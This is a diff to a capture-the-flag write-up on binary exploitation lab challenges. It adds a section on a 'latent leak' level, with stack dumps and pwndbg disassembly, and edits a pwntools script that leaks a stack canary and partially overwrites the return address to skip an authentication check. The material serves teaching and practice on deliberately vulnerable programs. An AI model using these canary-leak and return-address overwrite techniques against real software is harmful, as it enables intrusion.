@@ -6025,7 +6025,7 @@ This time, the program does not print any data. We will have to leak the stack c
 We need the following information to craft our exploit:
 - [ ] Location of buffer
 - [ ] Location of canary
-- [ ] Expected substring in order to loop the challenge
+- [ ] Expected substring in order to loop the `challenge()` function
 - [ ] Location of stored return address to `main()`
 - [ ] Offset of instruction within `win_authed()` which skips the authentication
 
@@ -6093,7 +6093,7 @@ End of assembler dump.
 
 - [ ] Location of buffer
 - [ ] Location of canary
-- [ ] Expected substring in order to loop the challenge
+- [ ] Expected substring in order to loop the `challenge()` function
 - [ ] Location of stored return address to `main()`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
 
@@ -6261,7 +6261,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 
 - [x] Location of buffer: `0x7fff92176c60`
 - [ ] Location of canary
-- [ ] Expected substring in order to loop the challenge
+- [ ] Expected substring in order to loop the `challenge()` function
 - [ ] Location of stored return address to `main()`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
 
@@ -6295,7 +6295,7 @@ We can infer that the value at `0x7fff92176c78` is the canary because of the lea
 
 - [x] Location of buffer: `0x7fff92176c60`
 - [x] Location of canary: `0x7fff92176c78`
-- [ ] Expected substring in order to loop the challenge
+- [ ] Expected substring in order to loop the `challenge()` function
 - [ ] Location of stored return address to `main()`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
 
@@ -6312,7 +6312,7 @@ Stack level 0, frame at 0x7fff92176c90:
 
 - [x] Location of buffer: `0x7fff92176c60`
 - [x] Location of canary: `0x7fff92176c78`
-- [ ] Expected substring in order to loop the challenge
+- [ ] Expected substring in order to loop the `challenge()` function
 - [x] Location of stored return address to `main()`: `0x7fff92176c88`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
 
@@ -6380,7 +6380,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 
 - [x] Location of buffer: `0x7fff92176c60`
 - [x] Location of canary: `0x7fff92176c78`
-- [x] Expected substring in order to loop the challenge: `REPEAT`
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
 - [x] Location of stored return address to `main()`: `0x7fff92176c88`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
 
@@ -6407,9 +6407,7 @@ while True:
     
     try:
         # Standard offsets for this challenge level
-        # If your previous leak was 24, try 24, but let's verify the output
         offset_to_canary = canary_addr - buffer_addr               # Distance from start of buffer to the canary
-        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 
 
         # --- STAGE 1: LEAK ---
         p.recvuntil(b'Payload size: ')
@@ -6427,17 +6425,9 @@ while True:
         canary_raw = p.recv(7)
         canary = u64(canary_raw.rjust(8, b'\x00'))
 
-        # SANITY CHECK: Real canaries are random and usually don't look like "Backdo"
-        if b"Back" in canary_raw or b"door" in canary_raw:
-            if attempt % 50 == 0:
-                print(f"[*] Attempt {attempt}: Leak looks like strings. Adjusting offset...")
-            p.close()
-            continue
-
-        if attempt % 20 == 0:
-            print(f"[+] Attempt {attempt} | Valid Canary Leak: {hex(canary)}")
-
         # --- STAGE 2: EXPLOIT ---
+        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 
+
         p.recvuntil(b'Payload size: ')
         
         # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
@@ -7508,7 +7498,7 @@ pwndbg> break *(verify_flag+75)
 Breakpoint 1 at 0x1f47
 ```
 
-### `challenge()`
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge 
@@ -7753,3 +7743,2229 @@ Goodbye!
 [*] Got EOF while reading in interactive
 $ 
 ```
+
+&nbsp;
+
+## Latent Leak (Easy)
+
+```
+hacker@program-security~latent-leak-easy:/$ /challenge/latent-leak-easy 
+###
+### Welcome to /challenge/latent-leak-easy!
+###
+
+The challenge() function has just been launched!
+However... An important initialization step was missed.
+Use this to your advantage!
+
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffca8e19500 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19508 (rsp+0x0008) | 88 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a888 |
+| 0x00007ffca8e19510 (rsp+0x0010) | 78 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a878 |
+| 0x00007ffca8e19518 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffca8e19520 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19528 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19530 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19538 (rsp+0x0038) | 40 95 e1 a8 fc 7f 00 00 | 0x00007ffca8e19540 |
+| 0x00007ffca8e19540 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19548 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19550 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19558 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19560 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19568 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19570 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19578 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19580 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19588 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19590 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19598 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195a8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195b0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195b8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195c0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195c8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195d0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195d8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195e0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195e8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195f0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195f8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19600 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19608 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19610 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19618 (rsp+0x0118) | 93 11 3d b6 eb 7b 00 00 | 0x00007bebb63d1193 |
+| 0x00007ffca8e19620 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
+| 0x00007ffca8e19628 (rsp+0x0128) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
+| 0x00007ffca8e19630 (rsp+0x0130) | 00 40 3b b6 eb 7b 00 00 | 0x00007bebb63b4000 |
+| 0x00007ffca8e19638 (rsp+0x0138) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
+| 0x00007ffca8e19640 (rsp+0x0140) | 00 42 c3 0b 92 59 00 00 | 0x000059920bc34200 |
+| 0x00007ffca8e19648 (rsp+0x0148) | 70 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a870 |
+| 0x00007ffca8e19650 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19658 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19660 (rsp+0x0160) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
+| 0x00007ffca8e19668 (rsp+0x0168) | 3f 3d 22 b6 eb 7b 00 00 | 0x00007bebb6223d3f |
+| 0x00007ffca8e19670 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007ffca8e19678 (rsp+0x0178) | 50 97 e1 a8 fc 7f 00 00 | 0x00007ffca8e19750 |
+| 0x00007ffca8e19680 (rsp+0x0180) | 90 96 e1 a8 fc 7f 00 00 | 0x00007ffca8e19690 |
+| 0x00007ffca8e19688 (rsp+0x0188) | 8d 0e 25 b6 eb 7b 00 00 | 0x00007bebb6250e8d |
+| 0x00007ffca8e19690 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
+| 0x00007ffca8e19698 (rsp+0x0198) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
+| 0x00007ffca8e196a0 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007ffca8e196a8 (rsp+0x01a8) | 23 f7 3a b6 eb 7b 00 00 | 0x00007bebb63af723 |
+| 0x00007ffca8e196b0 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffca8e196b8 (rsp+0x01b8) | 51 29 25 b6 eb 7b 00 00 | 0x00007bebb6252951 |
+| 0x00007ffca8e196c0 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffca8e196c8 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007ffca8e196d0 (rsp+0x01d0) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
+| 0x00007ffca8e196d8 (rsp+0x01d8) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
+| 0x00007ffca8e196e0 (rsp+0x01e0) | 40 55 3b b6 eb 7b 00 00 | 0x00007bebb63b5540 |
+| 0x00007ffca8e196e8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e196f0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e196f8 (rsp+0x01f8) | 93 2e 25 b6 eb 7b 00 00 | 0x00007bebb6252e93 |
+| 0x00007ffca8e19700 (rsp+0x0200) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
+| 0x00007ffca8e19708 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007ffca8e19710 (rsp+0x0210) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
+| 0x00007ffca8e19718 (rsp+0x0218) | 02 83 24 b6 eb 7b 00 00 | 0x00007bebb6248302 |
+| 0x00007ffca8e19720 (rsp+0x0220) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
+| 0x00007ffca8e19728 (rsp+0x0228) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
+| 0x00007ffca8e19730 (rsp+0x0230) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
+| 0x00007ffca8e19738 (rsp+0x0238) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
+| 0x00007ffca8e19740 (rsp+0x0240) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
+| 0x00007ffca8e19748 (rsp+0x0248) | 30 58 c3 0b 92 59 00 00 | 0x000059920bc35830 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffca8e19500, and our base pointer points to 0x7ffca8e19740.
+This means that we have (decimal) 74 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 592 bytes.
+The input buffer begins at 0x7ffca8e19540, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 493 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, there is no "win" variable.
+You will need to force the program to execute the win_authed() function
+by directly overflowing into the stored return address back to main,
+which is stored at 0x7ffca8e19748, 520 bytes after the start of your input buffer.
+That means that you will need to input at least 528 bytes (493 to fill the buffer,
+27 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+Because the binary is position independent, you cannot know
+exactly where the win_authed() function is located.
+This means that it is not clear what should be written into the return address.
+
+Payload size: 2
+You have chosen to send 2 bytes of input!
+This will allow you to write from 0x7ffca8e19540 (the start of the input buffer)
+right up to (but not including) 0x7ffca8e19542 (which is -491 bytes beyond the end of the buffer).
+Of these, you will overwrite -518 bytes into the return address.
+If that number is greater than 8, you will overwrite the entire return address.
+
+Overwriting the entire return address is fine when we know
+the whole address, but here, we only really know the last three nibbles.
+These nibbles never change, because pages are aligned to 0x1000.
+This gives us a workaround: we can overwrite the least significant byte
+of the saved return address, which we can know from debugging the binary,
+to retarget the return to main to any instruction that shares the other 7 bytes.
+Since that last byte will be constant between executions (due to page alignment),
+this will always work.
+If the address we want to redirect execution to is a bit farther away from
+the saved return address, and we need to write two bytes, then one of those
+nibbles (the fourth least-significant one) will be a guess, and it will be
+incorrect 15 of 16 times.
+This is okay: we can just run our exploit a few times until it works
+(statistically, ~50% chance after 11 times and ~90% chance after 36 times).
+One caveat in this challenge is that the win_authed() function must first auth:
+it only lets you win if you provide it with the argument 0x1337.
+Speifically, the win_authed() function looks something like:
+    void win_authed(int token)
+    {
+      if (token != 0x1337) return;
+      puts("You win! Here is your flag: ");
+      sendfile(1, open("/flag", 0), 0, 256);
+      puts("");
+    }
+
+So how do you pass the check? There *is* a way, and we will cover it later,
+but for now, we will simply bypass it! You can overwrite the return address
+with *any* value (as long as it points to executable code), not just the start
+of functions. Let's overwrite past the token check in win!
+
+To do this, we will need to analyze the program with objdump, identify where
+the check is in the win_authed() function, find the address right after the check,
+and write that address over the saved return address.
+
+Go ahead and find this address now. When you're ready, input a buffer overflow
+that will overwrite the saved return address (at 0x7ffca8e19748, 520 bytes into the buffer)
+with the correct value.
+
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffca8e19500 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19508 (rsp+0x0008) | 88 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a888 |
+| 0x00007ffca8e19510 (rsp+0x0010) | 78 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a878 |
+| 0x00007ffca8e19518 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffca8e19520 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19528 (rsp+0x0028) | 00 00 00 00 02 00 00 00 | 0x0000000200000000 |
+| 0x00007ffca8e19530 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
+| 0x00007ffca8e19538 (rsp+0x0038) | 40 95 e1 a8 fc 7f 00 00 | 0x00007ffca8e19540 |
+| 0x00007ffca8e19540 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
+| 0x00007ffca8e19548 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19550 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19558 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19560 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19568 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19570 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19578 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19580 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19588 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19590 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19598 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195a8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195b0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195b8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195c0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195c8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195d0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195d8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195e0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195e8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195f0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e195f8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19600 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19608 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19610 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19618 (rsp+0x0118) | 93 11 3d b6 eb 7b 00 00 | 0x00007bebb63d1193 |
+| 0x00007ffca8e19620 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
+| 0x00007ffca8e19628 (rsp+0x0128) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
+| 0x00007ffca8e19630 (rsp+0x0130) | 00 40 3b b6 eb 7b 00 00 | 0x00007bebb63b4000 |
+| 0x00007ffca8e19638 (rsp+0x0138) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
+| 0x00007ffca8e19640 (rsp+0x0140) | 00 42 c3 0b 92 59 00 00 | 0x000059920bc34200 |
+| 0x00007ffca8e19648 (rsp+0x0148) | 70 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a870 |
+| 0x00007ffca8e19650 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19658 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e19660 (rsp+0x0160) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
+| 0x00007ffca8e19668 (rsp+0x0168) | 3f 3d 22 b6 eb 7b 00 00 | 0x00007bebb6223d3f |
+| 0x00007ffca8e19670 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
+| 0x00007ffca8e19678 (rsp+0x0178) | 50 97 e1 a8 fc 7f 00 00 | 0x00007ffca8e19750 |
+| 0x00007ffca8e19680 (rsp+0x0180) | 90 96 e1 a8 fc 7f 00 00 | 0x00007ffca8e19690 |
+| 0x00007ffca8e19688 (rsp+0x0188) | 8d 0e 25 b6 eb 7b 00 00 | 0x00007bebb6250e8d |
+| 0x00007ffca8e19690 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
+| 0x00007ffca8e19698 (rsp+0x0198) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
+| 0x00007ffca8e196a0 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007ffca8e196a8 (rsp+0x01a8) | 23 f7 3a b6 eb 7b 00 00 | 0x00007bebb63af723 |
+| 0x00007ffca8e196b0 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffca8e196b8 (rsp+0x01b8) | 51 29 25 b6 eb 7b 00 00 | 0x00007bebb6252951 |
+| 0x00007ffca8e196c0 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffca8e196c8 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007ffca8e196d0 (rsp+0x01d0) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
+| 0x00007ffca8e196d8 (rsp+0x01d8) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
+| 0x00007ffca8e196e0 (rsp+0x01e0) | 40 55 3b b6 eb 7b 00 00 | 0x00007bebb63b5540 |
+| 0x00007ffca8e196e8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e196f0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffca8e196f8 (rsp+0x01f8) | 93 2e 25 b6 eb 7b 00 00 | 0x00007bebb6252e93 |
+| 0x00007ffca8e19700 (rsp+0x0200) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
+| 0x00007ffca8e19708 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
+| 0x00007ffca8e19710 (rsp+0x0210) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
+| 0x00007ffca8e19718 (rsp+0x0218) | 02 83 24 b6 eb 7b 00 00 | 0x00007bebb6248302 |
+| 0x00007ffca8e19720 (rsp+0x0220) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
+| 0x00007ffca8e19728 (rsp+0x0228) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
+| 0x00007ffca8e19730 (rsp+0x0230) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
+| 0x00007ffca8e19738 (rsp+0x0238) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
+| 0x00007ffca8e19740 (rsp+0x0240) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
+| 0x00007ffca8e19748 (rsp+0x0248) | 30 58 c3 0b 92 59 00 00 | 0x000059920bc35830 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffca8e19540
+- the saved frame pointer (of main) is at 0x7ffca8e19740
+- the saved return address (previously to main) is at 0x7ffca8e19748
+- the saved return address is now pointing to 0x59920bc35830.
+- the canary is stored at 0x7ffca8e19738.
+- the canary value is now 0xb5c062ea8723a300.
+- the address of win_authed() is 0x59920bc34e27.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+You said: aa
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+Goodbye!
+### Goodbye!
+```
+
+Since the program did not clean up the stack, we can see the canary of the previous function is the same as the current one: `0xb5c062ea8723a300`.
+If we manage to leak this canary using a buffer over-read, we can pass it in place of the canary of the current function.
+
+We need the following: 
+- [ ] Expected substring in order to loop the `challenge()` function
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001110  __cxa_finalize@plt
+0x0000000000001120  putchar@plt
+0x0000000000001130  __errno_location@plt
+0x0000000000001140  puts@plt
+0x0000000000001150  write@plt
+0x0000000000001160  __stack_chk_fail@plt
+0x0000000000001170  printf@plt
+0x0000000000001180  geteuid@plt
+0x0000000000001190  read@plt
+0x00000000000011a0  setvbuf@plt
+0x00000000000011b0  open@plt
+0x00000000000011c0  __isoc99_scanf@plt
+0x00000000000011d0  exit@plt
+0x00000000000011e0  strerror@plt
+0x00000000000011f0  strstr@plt
+0x0000000000001200  _start
+0x0000000000001230  deregister_tm_clones
+0x0000000000001260  register_tm_clones
+0x00000000000012a0  __do_global_dtors_aux
+0x00000000000012e0  frame_dummy
+0x00000000000012e9  DUMP_STACK
+0x00000000000014ec  bin_padding
+0x0000000000001e27  win_authed
+0x0000000000001f44  challenge
+0x000000000000275b  main
+0x0000000000002860  __libc_csu_init
+0x00000000000028d0  __libc_csu_fini
+0x00000000000028d8  _fini
+```
+
+#### `win_authed()`
+
+```
+pwndbg> disassemble win_authed 
+Dump of assembler code for function win_authed:
+   0x0000000000001e27 <+0>:     endbr64
+   0x0000000000001e2b <+4>:     push   rbp
+   0x0000000000001e2c <+5>:     mov    rbp,rsp
+   0x0000000000001e2f <+8>:     sub    rsp,0x10
+   0x0000000000001e33 <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000001e36 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x0000000000001e3d <+22>:    jne    0x1f41 <win_authed+282>
+   0x0000000000001e43 <+28>:    lea    rdi,[rip+0x12a6]        # 0x30f0
+
+# ---- snip ----
+
+   0x0000000000001f41 <+282>:   nop
+   0x0000000000001f42 <+283>:   leave
+   0x0000000000001f43 <+284>:   ret
+End of assembler dump.
+```
+
+We need the following: 
+- [ ] Expected substring in order to loop the `challenge()` function
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1e43`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# ---- snip ----
+
+   0x00000000000024c3 <+1407>:  mov    rdx,QWORD PTR [rbp-0x210]
+   0x00000000000024ca <+1414>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x00000000000024d1 <+1421>:  mov    rsi,rax
+   0x00000000000024d4 <+1424>:  mov    edi,0x0
+   0x00000000000024d9 <+1429>:  call   0x1190 <read@plt>
+
+# ---- snip ----
+
+   0x00000000000026e8 <+1956>:  call   0x1140 <puts@plt>
+   0x00000000000026ed <+1961>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x00000000000026f4 <+1968>:  lea    rsi,[rip+0x1ef6]        # 0x45f1
+   0x00000000000026fb <+1975>:  mov    rdi,rax
+   0x00000000000026fe <+1978>:  call   0x11f0 <strstr@plt>
+   0x0000000000002703 <+1983>:  test   rax,rax
+   0x0000000000002706 <+1986>:  je     0x2734 <challenge+2032>
+   0x0000000000002708 <+1988>:  lea    rdi,[rip+0x1ee9]        # 0x45f8
+   0x000000000000270f <+1995>:  call   0x1140 <puts@plt>
+   0x0000000000002714 <+2000>:  mov    rdx,QWORD PTR [rbp-0x238]
+   0x000000000000271b <+2007>:  mov    rcx,QWORD PTR [rbp-0x230]
+   0x0000000000002722 <+2014>:  mov    eax,DWORD PTR [rbp-0x224]
+   0x0000000000002728 <+2020>:  mov    rsi,rcx
+   0x000000000000272b <+2023>:  mov    edi,eax
+   0x000000000000272d <+2025>:  call   0x1f44 <challenge>
+   0x0000000000002732 <+2030>:  jmp    0x2745 <challenge+2049>
+   0x0000000000002734 <+2032>:  lea    rdi,[rip+0x1ee7]        # 0x4622
+   0x000000000000273b <+2039>:  call   0x1140 <puts@plt>
+   0x0000000000002740 <+2044>:  mov    eax,0x0
+   0x0000000000002745 <+2049>:  mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000002749 <+2053>:  xor    rcx,QWORD PTR fs:0x28
+   0x0000000000002752 <+2062>:  je     0x2759 <challenge+2069>
+   0x0000000000002754 <+2064>:  call   0x1160 <__stack_chk_fail@plt>
+   0x0000000000002759 <+2069>:  leave
+   0x000000000000275a <+2070>:  ret
+End of assembler dump.
+```
+
